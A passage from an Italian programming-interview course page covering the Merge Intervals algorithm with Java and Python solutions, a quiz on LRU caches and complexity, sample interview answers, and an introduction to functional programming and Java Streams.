                        <li><code>[[1,4],[0,4]]</code> → <code>[[0,4]]</code></li>
                    </ul>
                </div>

                <h3>Approccio: Sort + Linear Scan</h3>

                <p>La chiave è <strong>ordinare per start time</strong>. Dopo l'ordinamento, gli intervalli sovrapponibili sono adiacenti, e possiamo fare un singolo passaggio per unirli.</p>

                <div class="diagram">
                    <pre>
Input: [[1,3], [2,6], [8,10], [15,18]]

1. Già ordinato per start

2. Visualizzazione:
   1────3
      2────────6
                   8────10
                              15────18

3. Merge Logic:
   - [1,3] → aggiungi a result: [[1,3]]
   - [2,6] → 2 ≤ 3 (overlap!) → estendi: [[1,6]]
   - [8,10] → 8 > 6 (no overlap) → aggiungi: [[1,6], [8,10]]
   - [15,18] → 15 > 10 (no overlap) → aggiungi: [[1,6], [8,10], [15,18]]

Output: [[1,6], [8,10], [15,18]]
                    </pre>
                </div>

                <h3>Soluzione Java</h3>

                <pre><code class="language-java">class Solution {
    public int[][] merge(int[][] intervals) {
        if (intervals.length &lt;= 1) {
            return intervals;
        }

        // 1. Ordina per start time
        Arrays.sort(intervals, (a, b) -> Integer.compare(a[0], b[0]));

        // 2. Lista per il risultato (dimensione variabile)
        List&lt;int[]&gt; result = new ArrayList&lt;&gt;();

        // 3. Inizia con il primo intervallo
        int[] current = intervals[0];
        result.add(current);

        // 4. Scorri e unisci
        for (int[] interval : intervals) {
            int currentEnd = current[1];
            int nextStart = interval[0];
            int nextEnd = interval[1];

            if (nextStart &lt;= currentEnd) {
                // Overlap: estendi l'intervallo corrente
                // Nota: prendiamo il max degli end perché un intervallo
                // potrebbe essere contenuto in un altro
                current[1] = Math.max(currentEnd, nextEnd);
            } else {
                // No overlap: aggiungi nuovo intervallo
                current = interval;
                result.add(current);
            }
        }

        return result.toArray(new int[result.size()][]);
    }
}

// Esempio d'uso
// Input:  [[1,3],[2,6],[8,10],[15,18]]
// Output: [[1,6],[8,10],[15,18]]</code></pre>

                <h3>Soluzione Python</h3>

                <pre><code class="language-python">def merge(intervals: list[list[int]]) -> list[list[int]]:
    if not intervals:
        return []

    # Ordina per start time
    intervals.sort(key=lambda x: x[0])

    result = [intervals[0]]

    for start, end in intervals[1:]:
        # Ultimo intervallo nel risultato
        last = result[-1]

        if start <= last[1]:
            # Overlap: estendi
            last[1] = max(last[1], end)
        else:
            # No overlap: aggiungi
            result.append([start, end])

    return result


# Test
print(merge([[1,3],[2,6],[8,10],[15,18]]))  # [[1,6],[8,10],[15,18]]
print(merge([[1,4],[4,5]]))                  # [[1,5]]
print(merge([[1,4],[0,2],[3,5]]))            # [[0,5]] dopo sorting</code></pre>

                <h3>Analisi della Complessità</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>Complessità</th>
                            <th>Spiegazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Time</td>
                            <td><strong>O(n log n)</strong></td>
                            <td>Dominato dal sorting. Il merge è O(n)</td>
                        </tr>
                        <tr>
                            <td>Space</td>
                            <td><strong>O(n)</strong></td>
                            <td>Per il risultato (nel caso peggiore, nessun merge)</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Perché O(n log n) è ottimale?</h4>
                    <p>Non possiamo fare meglio di O(n log n) perché dobbiamo ordinare gli intervalli. Se gli intervalli fossero già ordinati (o potessimo assumere che lo siano), la complessità sarebbe O(n). Questo è un buon punto da menzionare al colloquio: chiedi sempre se l'input è già ordinato!</p>
                </div>

                <div class="info-box success">
                    <h4>Varianti del Problema</h4>
                    <ul>
                        <li><strong>Insert Interval</strong>: Inserisci un nuovo intervallo in una lista già ordinata e merged</li>
                        <li><strong>Meeting Rooms</strong>: Verifica se una persona può partecipare a tutte le riunioni (no overlap)</li>
                        <li><strong>Meeting Rooms II</strong>: Quante sale servono per tutte le riunioni? (richiede min-heap)</li>
                        <li><strong>Non-overlapping Intervals</strong>: Minimo numero di intervalli da rimuovere per eliminare overlap</li>
                    </ul>
                </div>
            </section>

            <!-- Quiz Section Modulo 7 -->
            <section class="quiz-section" id="modulo7-quiz">
                <h2>Interactive Challenge Quiz - Modulo 7</h2>
                <p>Verifica la tua comprensione degli algoritmi e delle complessità con queste domande.</p>

                <!-- Question 31 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> Nella LRU Cache, perché usiamo una Doubly Linked List invece di una Singly Linked List?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q31" id="q31a" value="a">
                            <label for="q31a">Per supportare l'iterazione bidirezionale sui dati</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q31" id="q31b" value="b">
                            <label for="q31b">Per rimuovere un nodo in O(1) senza dover attraversare la lista</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q31" id="q31c" value="c">
                            <label for="q31c">Per ridurre lo spazio occupato in memoria</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q31" id="q31d" value="d">
                            <label for="q31d">Perché Java non supporta Singly Linked List nativamente</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q31')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q31"></div>
                </div>

                <!-- Question 32 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q2.</span> Quale sarebbe la complessità temporale di una LRU Cache implementata con solo una LinkedHashMap (senza custom logic)?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q32" id="q32a" value="a">
                            <label for="q32a">get: O(n), put: O(n)</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q32" id="q32b" value="b">
                            <label for="q32b">get: O(1), put: O(n) per l'eviction</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q32" id="q32c" value="c">
                            <label for="q32c">get: O(1), put: O(1) - LinkedHashMap con accessOrder=true lo gestisce</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q32" id="q32d" value="d">
                            <label for="q32d">get: O(log n), put: O(log n)</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q32')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q32"></div>
                </div>

                <!-- Question 33 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Per il problema Valid Parentheses, se la stringa contiene solo '(' e ')', qual è lo space complexity ottimale?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q33" id="q33a" value="a">
                            <label for="q33a">O(1) - basta un contatore</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q33" id="q33b" value="b">
                            <label for="q33b">O(n) - serve sempre uno stack</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q33" id="q33c" value="c">
                            <label for="q33c">O(log n) - usando una struttura ad albero</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q33" id="q33d" value="d">
                            <label for="q33d">O(n²) - bisogna confrontare ogni coppia</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q33')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q33"></div>
                </div>

                <!-- Question 34 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> Nel problema Merge Intervals, se l'input fosse già ordinato per start time, quale sarebbe la complessità totale?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q34" id="q34a" value="a">
                            <label for="q34a">Sempre O(n log n) - il sorting è comunque necessario per verificare l'ordine</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q34" id="q34b" value="b">
                            <label for="q34b">O(n²) - bisogna confrontare ogni intervallo con tutti gli altri</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q34" id="q34c" value="c">
                            <label for="q34c">O(1) - con input ordinato il problema diventa banale</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q34" id="q34d" value="d">
                            <label for="q34d">O(n) - singolo passaggio lineare per il merge</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q34')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q34"></div>
                </div>

                <!-- Question 35 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q5.</span> Stai implementando una LRU Cache per un sistema ad alta concorrenza. Quale problema principale devi risolvere?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q35" id="q35a" value="a">
                            <label for="q35a">La HashMap non è thread-safe, basta usare ConcurrentHashMap</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q35" id="q35b" value="b">
                            <label for="q35b">get() e put() devono essere atomiche: sia HashMap che lista devono essere aggiornate insieme</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q35" id="q35c" value="c">
                            <label for="q35c">La Doubly Linked List non può essere condivisa tra thread</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q35" id="q35d" value="d">
                            <label for="q35d">Non c'è problema: le strutture dati in Java sono sempre thread-safe</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q35')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q35"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 7 -->
            <section class="section" id="modulo7-questions">
                <h2>Domande da Colloquio - Modulo 7</h2>

                <div class="info-box">
                    <h4>Q: Spiega come implementeresti una LRU Cache. Quali strutture dati useresti e perché?</h4>
                    <p><strong>Risposta attesa:</strong> Userei una combinazione di HashMap e Doubly Linked List. La HashMap fornisce O(1) lookup per chiave, mappando la chiave al nodo corrispondente nella lista. La Doubly Linked List mantiene l'ordine di utilizzo: il nodo più recente (MRU) è in testa, il meno recente (LRU) è in coda. Con i puntatori prev/next, posso rimuovere un nodo in O(1) senza attraversare la lista. Quando accedo a un elemento, lo sposto in testa. Quando la cache è piena, rimuovo l'elemento in coda. Entrambe le operazioni sono O(1).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Nel problema Valid Parentheses, come gestiresti il caso con parentesi annidate come <code>"{[()]}"</code>?</h4>
                    <p><strong>Risposta attesa:</strong> Lo stack gestisce naturalmente l'annidamento. Quando incontro una parentesi aperta, la pusha. Quando incontro una chiusa, verifico che lo stack non sia vuoto e che il top sia la corrispondente aperta. Per <code>"{[()]}"</code>: push '{', push '[', push '(', pop e verifica '(' con ')', pop e verifica '[' con ']', pop e verifica '{' con '}'. Lo stack è vuoto alla fine → valido. L'ordine LIFO dello stack garantisce che le parentesi più interne siano chiuse prima di quelle esterne.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Perché nel Merge Intervals ordiniamo per start time e non per end time?</h4>
                    <p><strong>Risposta attesa:</strong> Ordinando per start time, garantiamo che quando processiamo un intervallo, tutti quelli che potrebbero sovrapporsi con esso (con start minore) sono già stati processati. L'overlap si verifica quando il prossimo start è ≤ dell'end corrente. Se ordinassimo per end time, non avremmo questa proprietà: un intervallo con end piccolo potrebbe avere start grande, rendendo impossibile determinare l'overlap con un singolo passaggio. Con start time ordering, possiamo fare merge in O(n) dopo il sorting.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come renderesti thread-safe una LRU Cache?</h4>
                    <p><strong>Risposta attesa:</strong> Il problema principale è che get() e put() modificano sia la HashMap che la lista, e queste operazioni devono essere atomiche. Opzioni: 1) Lock globale (synchronized o ReentrantLock): semplice ma crea contention. 2) Read-write lock: permette letture concorrenti, ma get() in LRU modifica la lista (sposta a MRU), quindi è comunque una write. 3) Striped locking: dividi la cache in segmenti con lock indipendenti (come ConcurrentHashMap), ma complica la gestione LRU globale. 4) In Java, considera Collections.synchronizedMap(new LinkedHashMap) o Caffeine (libreria ottimizzata per caching concorrente).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Qual è la differenza tra O(n) e O(n log n)? Quando diventa significativa?</h4>
                    <p><strong>Risposta attesa:</strong> O(n) è lineare: raddoppiando l'input, raddoppia il tempo. O(n log n) cresce leggermente più velocemente: log₂(1M) ≈ 20, quindi per 1M elementi è circa 20M operazioni vs 1M. La differenza diventa significativa con grandi dataset: per n=1 miliardo, O(n) = 1B operazioni, O(n log n) ≈ 30B operazioni (30x più lento). Tuttavia, per n piccoli (< 1000), le costanti nascoste nella notazione O possono dominare, e un algoritmo O(n log n) ben ottimizzato può battere un O(n) con costanti alte. Sempre profilare con dati reali.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Se dovessi scegliere tra un algoritmo O(n²) con space O(1) e uno O(n log n) con space O(n), cosa considereresti?</h4>
                    <p><strong>Risposta attesa:</strong> Dipende dal contesto. Fattori: 1) Dimensione dell'input: per n piccolo (< 100), O(n²) può essere più veloce per costanti minori. 2) Memoria disponibile: in sistemi embedded o con dati enormi, O(1) space può essere obbligatorio. 3) Cache locality: O(n²) in-place può avere migliore cache performance. 4) Parallelizzabilità: merge sort (O(n log n)) parallelizza bene. 5) Stabilità: se serve sorting stabile, influenza la scelta. In generale, per n > 1000 con memoria disponibile, O(n log n) è preferibile. Sempre chiedere i constraint specifici al colloquio.</p>
                </div>
            </section>

            <!-- ==================== MODULO 8: PARADIGMI DI PROGRAMMAZIONE ==================== -->

            <header class="module-header" id="modulo8">
                <span class="module-tag">Modulo 8</span>
                <h1>Paradigmi di Programmazione</h1>
                <p>Programmazione Funzionale, confronto con OOP e casi d'uso pratici in Java</p>
            </header>

            <!-- Functional Programming Section -->
            <section class="section" id="modulo8-functional">
                <h2>Programmazione Funzionale: Principi Fondamentali</h2>

                <p>La <strong>Programmazione Funzionale</strong> (FP) è un paradigma che tratta il calcolo come valutazione di funzioni matematiche, evitando stati mutabili e side effects. Mentre la OOP modella il mondo come oggetti con stato e comportamento, la FP modella il mondo come trasformazioni di dati.</p>

                <div class="info-box">
                    <h4>Perché la Programmazione Funzionale nel 2026?</h4>
                    <p>Con l'aumento della concorrenza (multi-core, distributed systems), la FP offre vantaggi significativi: codice senza side effects è naturalmente thread-safe, più facile da testare e da ragionare. Java ha abbracciato molti concetti FP da Java 8 in poi (Streams, Lambdas, Optional).</p>
                </div>

                <h3>I Pilastri della Programmazione Funzionale</h3>

                <h4>1. Pure Functions</h4>

                <p>Una <strong>pure function</strong> ha due caratteristiche:</p>
                <ul>
                    <li><strong>Deterministica</strong>: dato lo stesso input, produce sempre lo stesso output</li>
                    <li><strong>No side effects</strong>: non modifica stato esterno, non fa I/O, non muta gli argomenti</li>
                </ul>

                <pre><code class="language-java">// ❌ IMPURA: dipende da stato esterno
private double taxRate = 0.22;

public double calculateTax(double amount) {
    return amount * taxRate;  // Dipende da taxRate che può cambiare
}

// ❌ IMPURA: side effect (modifica stato esterno)
private List&lt;String&gt; logs = new ArrayList&lt;&gt;();

public int process(int x) {
    logs.add("Processing: " + x);  // Side effect!
    return x * 2;
}

// ✅ PURA: stesso input → stesso output, nessun side effect
public double calculateTax(double amount, double taxRate) {
    return amount * taxRate;
}

// ✅ PURA: trasforma input in output senza mutare nulla
public List&lt;Integer&gt; doubleAll(List&lt;Integer&gt; numbers) {
    return numbers.stream()
        .map(n -> n * 2)
        .toList();  // Ritorna NUOVA lista, non muta l'originale
}</code></pre>

                <h4>2. Immutability</h4>

                <p>In FP, i dati non vengono mai modificati dopo la creazione. Invece di mutare, si creano nuove versioni con le modifiche desiderate.</p>

                <pre><code class="language-java">// ❌ MUTABILE: l'oggetto può essere modificato
public class MutablePerson {
    private String name;
    private int age;

    public void setName(String name) { this.name = name; }
    public void setAge(int age) { this.age = age; }
}

// ✅ IMMUTABILE: una volta creato, non può cambiare
public record Person(String name, int age) {
    // I record Java sono immutabili per design

    // Per "modificare", crea una nuova istanza
    public Person withAge(int newAge) {
        return new Person(this.name, newAge);
    }
}

// Uso
Person alice = new Person("Alice", 30);
Person olderAlice = alice.withAge(31);  // alice resta invariata!

System.out.println(alice.age());       // 30
System.out.println(olderAlice.age());  // 31</code></pre>

                <div class="info-box success">
                    <h4>Vantaggi dell'Immutabilità</h4>
                    <ul>
                        <li><strong>Thread-safety gratis</strong>: oggetti immutabili possono essere condivisi tra thread senza sincronizzazione</li>
                        <li><strong>Nessun defensive copying</strong>: puoi passare riferimenti senza paura che vengano modificati</li>
                        <li><strong>Facile da testare</strong>: nessuno stato nascosto che cambia tra le chiamate</li>
                        <li><strong>Caching sicuro</strong>: puoi usare oggetti immutabili come chiavi di HashMap</li>
                    </ul>
                </div>

                <h4>3. First-Class Functions</h4>

                <p>Le funzioni sono "cittadini di prima classe": possono essere assegnate a variabili, passate come argomenti e ritornate da altre funzioni.</p>

                <pre><code class="language-java">// Funzione assegnata a una variabile
Function&lt;Integer, Integer&gt; double_ = x -> x * 2;
Function&lt;Integer, Integer&gt; square = x -> x * x;

// Funzione passata come argomento
public List&lt;Integer&gt; transform(List&lt;Integer&gt; list, Function&lt;Integer, Integer&gt; fn) {
    return list.stream().map(fn).toList();
}

List&lt;Integer&gt; numbers = List.of(1, 2, 3, 4);
transform(numbers, double_);  // [2, 4, 6, 8]
transform(numbers, square);   // [1, 4, 9, 16]

// Funzione che ritorna una funzione (Higher-Order Function)
public Function&lt;Integer, Integer&gt; multiplier(int factor) {
    return x -> x * factor;  // Closure: "cattura" factor
}

Function&lt;Integer, Integer&gt; triple = multiplier(3);
triple.apply(5);  // 15</code></pre>

                <h4>4. Higher-Order Functions</h4>

                <p>Le <strong>higher-order functions</strong> sono funzioni che prendono altre funzioni come argomenti o le ritornano. Le tre più importanti sono <code>map</code>, <code>filter</code> e <code>reduce</code>.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    HIGHER-ORDER FUNCTIONS                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  MAP: Trasforma ogni elemento                                                │
│  ─────────────────────────────                                               │
│  [1, 2, 3, 4]  ──map(x → x²)──▶  [1, 4, 9, 16]                             │
│                                                                              │
│  FILTER: Seleziona elementi che soddisfano un predicato                     │
│  ─────────────────────────────────────────────────────                       │
│  [1, 2, 3, 4]  ──filter(x → x%2==0)──▶  [2, 4]                              │
│                                                                              │
│  REDUCE: Combina tutti gli elementi in un singolo valore                    │
│  ─────────────────────────────────────────────────────                       │
│  [1, 2, 3, 4]  ──reduce(0, (acc,x) → acc+x)──▶  10                          │
│                                                                              │
│  COMPOSIZIONE (Pipeline):                                                    │
│  ─────────────────────────                                                   │
│  [1, 2, 3, 4, 5, 6]                                                         │
│       │                                                                      │
│       ▼  filter(x → x%2==0)                                                 │
│  [2, 4, 6]                                                                   │
│       │                                                                      │
│       ▼  map(x → x²)                                                        │
│  [4, 16, 36]                                                                 │
│       │                                                                      │
│       ▼  reduce(0, +)                                                       │
│  56                                                                          │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">List&lt;Integer&gt; numbers = List.of(1, 2, 3, 4, 5, 6);

// Pipeline funzionale
int result = numbers.stream()
    .filter(n -> n % 2 == 0)      // [2, 4, 6]
    .map(n -> n * n)               // [4, 16, 36]
    .reduce(0, Integer::sum);      // 56

// Equivalente imperativo (meno leggibile, più error-prone)
int sumImperative = 0;
for (int n : numbers) {
    if (n % 2 == 0) {
        sumImperative += n * n;
    }
}</code></pre>
            </section>

            <!-- Java Streams Section -->
            <section class="section" id="modulo8-streams">
                <h2>Java Streams API</h2>

                <p>La <strong>Streams API</strong> (introdotta in Java 8) porta la programmazione funzionale in Java, permettendo di processare collezioni in modo dichiarativo e potenzialmente parallelo.</p>

                <div class="info-box warning">
                    <h4>Stream ≠ Collection</h4>
                    <p>Uno Stream non è una struttura dati: è una <em>pipeline di operazioni</em> su dati. Non memorizza elementi, li processa on-demand (lazy evaluation). Uno Stream può essere consumato una sola volta.</p>
                </div>

                <h3>Operazioni Intermedie vs Terminali</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Tipo</th>
                            <th>Comportamento</th>
                            <th>Esempi</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Intermediate</strong></td>
                            <td>Lazy, ritornano Stream, concatenabili</td>
                            <td><code>filter</code>, <code>map</code>, <code>flatMap</code>, <code>sorted</code>, <code>distinct</code>, <code>limit</code></td>
                        </tr>
                        <tr>
                            <td><strong>Terminal</strong></td>
                            <td>Eager, "consumano" lo stream, producono risultato</td>
                            <td><code>collect</code>, <code>forEach</code>, <code>reduce</code>, <code>count</code>, <code>findFirst</code>, <code>anyMatch</code></td>
                        </tr>
                    </tbody>
                </table>

                <pre><code class="language-java">// Le operazioni intermedie sono LAZY: non eseguono nulla finché
// non c'è un'operazione terminale

List&lt;String&gt; names = List.of("Alice", "Bob", "Charlie", "David");

Stream&lt;String&gt; stream = names.stream()
    .filter(name -> {
        System.out.println("Filtering: " + name);
        return name.length() > 3;
    })
    .map(String::toUpperCase);

// Nulla è stato stampato! Lo stream è lazy.

// Ora aggiungiamo un'operazione terminale
List&lt;String&gt; result = stream.toList();
// Output:
// Filtering: Alice
// Filtering: Bob
// Filtering: Charlie
// Filtering: David
// result = ["ALICE", "CHARLIE", "DAVID"]</code></pre>

                <h3>Operazioni Comuni con Esempi</h3>

                <pre><code class="language-java">record Order(String customer, List&lt;Item&gt; items, double total, Status status) {}
record Item(String name, double price, int quantity) {}
enum Status { PENDING, SHIPPED, DELIVERED, CANCELLED }

List&lt;Order&gt; orders = getOrders();

// 1. FILTER + MAP + COLLECT: Nomi dei clienti con ordini > €100
List&lt;String&gt; bigSpenders = orders.stream()
    .filter(o -> o.total() > 100)
    .map(Order::customer)
    .distinct()
    .sorted()
    .toList();

// 2. FLATMAP: Tutti gli item di tutti gli ordini (appiattisce liste nested)
List&lt;Item&gt; allItems = orders.stream()
    .flatMap(o -> o.items().stream())
    .toList();

// 3. GROUPING: Ordini raggruppati per status
Map&lt;Status, List&lt;Order&gt;&gt; byStatus = orders.stream()
    .collect(Collectors.groupingBy(Order::status));

// 4. REDUCE: Totale di tutti gli ordini
double grandTotal = orders.stream()
    .mapToDouble(Order::total)
    .sum();  // Specializzazione per primitive (più efficiente)

// 5. PARTITIONING: Divide in due gruppi (true/false)
Map&lt;Boolean, List&lt;Order&gt;&gt; shipped = orders.stream()
    .collect(Collectors.partitioningBy(
        o -> o.status() == Status.SHIPPED || o.status() == Status.DELIVERED
    ));

// 6. STATISTICS: Statistiche in un colpo solo
DoubleSummaryStatistics stats = orders.stream()
    .mapToDouble(Order::total)
    .summaryStatistics();
// stats.getAverage(), stats.getMax(), stats.getMin(), stats.getSum(), stats.getCount()

// 7. COLLECTORS AVANZATI: Media dei totali per status
Map&lt;Status, Double&gt; avgByStatus = orders.stream()
    .collect(Collectors.groupingBy(
        Order::status,
        Collectors.averagingDouble(Order::total)
    ));

// 8. OPTIONAL: Trova il primo ordine non spedito (se esiste)
Optional&lt;Order&gt; firstPending = orders.stream()
    .filter(o -> o.status() == Status.PENDING)
    .findFirst();</code></pre>

                <h3>Optional: Gestione Null-Safety</h3>

                <p><strong>Optional</strong> è un container che può contenere o meno un valore. È il modo funzionale di gestire l'assenza di valore, evitando NullPointerException.</p>

                <pre><code class="language-java">// ❌ Approccio imperativo: null checks ovunque
public String getCustomerCity(Order order) {
    if (order != null) {
        Customer customer = order.getCustomer();
        if (customer != null) {
            Address address = customer.getAddress();
            if (address != null) {
                return address.getCity();
            }
        }
    }
    return "Unknown";
}

// ✅ Approccio funzionale con Optional
public String getCustomerCity(Order order) {
    return Optional.ofNullable(order)
        .map(Order::getCustomer)
        .map(Customer::getAddress)
        .map(Address::getCity)
        .orElse("Unknown");
}

// Operazioni comuni su Optional
Optional&lt;String&gt; name = Optional.of("Alice");
Optional&lt;String&gt; empty = Optional.empty();

// map: trasforma il valore se presente
Optional&lt;Integer&gt; length = name.map(String::length);  // Optional[5]

// filter: mantiene il valore solo se soddisfa il predicato
Optional&lt;String&gt; longName = name.filter(n -> n.length() > 3);  // Optional[Alice]

// orElse: valore di default se vuoto
String result = empty.orElse("Default");  // "Default"

// orElseGet: lazy evaluation del default (utile se costoso da calcolare)
String result2 = empty.orElseGet(() -> computeExpensiveDefault());

// orElseThrow: lancia eccezione se vuoto
String result3 = empty.orElseThrow(() -> new NotFoundException("Not found"));

// ifPresent: esegue azione solo se presente
name.ifPresent(n -> System.out.println("Hello, " + n));

// ifPresentOrElse (Java 9+): if-else funzionale
name.ifPresentOrElse(
    n -> System.out.println("Found: " + n),
    () -> System.out.println("Not found")
);</code></pre>

                <div class="info-box warning">
                    <h4>Anti-pattern con Optional</h4>
                    <ul>
                        <li><strong>Optional.get() senza controllo</strong>: usa sempre orElse/orElseThrow</li>
                        <li><strong>Optional come campo di classe</strong>: Optional non è Serializable, usa solo per return type</li>
                        <li><strong>Optional&lt;Collection&gt;</strong>: ritorna collezione vuota invece, non Optional di collezione</li>
                        <li><strong>isPresent() + get()</strong>: usa map/flatMap/orElse invece</li>
                    </ul>
                </div>

                <h3>Parallel Streams</h3>

                <p>Gli Stream possono essere eseguiti in parallelo per sfruttare CPU multi-core. Ma attenzione: non sempre conviene!</p>

                <pre><code class="language-java">// Sequenziale
long count = numbers.stream()
    .filter(n -> isPrime(n))
    .count();

// Parallelo: divide il lavoro tra i core disponibili
long countParallel = numbers.parallelStream()
    .filter(n -> isPrime(n))
    .count();

// Oppure converti uno stream esistente
long countParallel2 = numbers.stream()
    .parallel()
    .filter(n -> isPrime(n))
    .count();</code></pre>

                <div class="info-box">
                    <h4>Quando usare Parallel Streams?</h4>
                    <p>Usa parallel streams solo quando:</p>
                    <ul>
                        <li><strong>Dataset grande</strong>: l'overhead di parallelizzazione vale solo con molti elementi (>10.000)</li>
                        <li><strong>Operazioni CPU-intensive</strong>: filtri/map complessi, non semplici operazioni aritmetiche</li>
                        <li><strong>Nessun side effect</strong>: le operazioni devono essere stateless e thread-safe</li>
                        <li><strong>Fonte splittabile</strong>: ArrayList sì, LinkedList no (non può dividere efficientemente)</li>
                    </ul>
                    <p><strong>NON usare</strong> per operazioni I/O-bound (network, disk) o con collezioni piccole.</p>
                </div>
            </section>

            <!-- OOP vs FP Comparison Section -->
            <section class="section" id="modulo8-comparison">
                <h2>OOP vs Programmazione Funzionale</h2>

                <p>OOP e FP non sono mutualmente esclusivi: Java moderno li combina efficacemente. La chiave è scegliere l'approccio giusto per ogni situazione.</p>

                <h3>Confronto Filosofico</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>OOP</th>
                            <th>Functional</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Unità base</strong></td>
                            <td>Oggetti (stato + comportamento)</td>
                            <td>Funzioni (trasformazioni)</td>
                        </tr>
                        <tr>
                            <td><strong>Stato</strong></td>
                            <td>Mutabile, incapsulato negli oggetti</td>
                            <td>Immutabile, passato esplicitamente</td>
                        </tr>
                        <tr>
                            <td><strong>Flusso</strong></td>
                            <td>Oggetti che si inviano messaggi</td>
                            <td>Dati che fluiscono attraverso funzioni</td>
                        </tr>
                        <tr>
                            <td><strong>Riuso</strong></td>
                            <td>Ereditarietà, composizione di oggetti</td>
                            <td>Composizione di funzioni</td>
                        </tr>
                        <tr>
                            <td><strong>Side effects</strong></td>
                            <td>Permessi e comuni</td>
                            <td>Evitati o isolati</td>
                        </tr>
                        <tr>
                            <td><strong>Concorrenza</strong></td>
                            <td>Richiede sincronizzazione esplicita</td>
                            <td>Naturalmente thread-safe (immutabilità)</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Quando Usare Cosa</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SCEGLIERE IL PARADIGMA GIUSTO                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  USA OOP QUANDO:                        USA FP QUANDO:                       │
│  ────────────────                       ─────────────────                    │
│  • Modelli entità del dominio           • Trasformi/processi dati           │
│    (User, Order, Product)               • Pipeline di elaborazione          │
│                                                                              │
│  • Hai stato che cambia nel tempo       • I dati sono immutabili            │
│    (carrello, sessione)                   (eventi, log, transazioni)        │
│                                                                              │
│  • Polimorfismo è centrale              • Composizione di operazioni        │
│    (Strategy, Template Method)            (map/filter/reduce)               │
│                                                                              │
│  • Framework richiede classi            • Alta concorrenza                  │
│    (Spring beans, JPA entities)           (parallel streams, reactive)      │
│                                                                              │
│  COMBINA ENTRAMBI (approccio Java moderno):                                 │
│  ──────────────────────────────────────────                                  │
│  • Domain objects (OOP) + service logic (FP)                                │
│  • Entities mutabili internamente, immutabili all'esterno (DTOs/Records)    │
│  • Streams per collezioni, Optional per null-safety                         │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Esempio Pratico: Stesso Problema, Due Approcci</h3>

                <pre><code class="language-java">// PROBLEMA: Calcola il totale degli ordini shipped per cliente

// ═══════════════════════════════════════════════════════════
// APPROCCIO OOP TRADIZIONALE
// ═══════════════════════════════════════════════════════════

public class OrderProcessor {
    private Map&lt;String, Double&gt; customerTotals = new HashMap&lt;&gt;();

    public void processOrders(List&lt;Order&gt; orders) {
        for (Order order : orders) {
            if (order.getStatus() == Status.SHIPPED) {
                String customer = order.getCustomer();
                double currentTotal = customerTotals.getOrDefault(customer, 0.0);
                customerTotals.put(customer, currentTotal + order.getTotal());
            }
        }
    }

    public Map&lt;String, Double&gt; getResults() {
        return new HashMap&lt;&gt;(customerTotals);  // Defensive copy
    }
}

// Uso
OrderProcessor processor = new OrderProcessor();
processor.processOrders(orders);
Map&lt;String, Double&gt; totals = processor.getResults();

// ═══════════════════════════════════════════════════════════
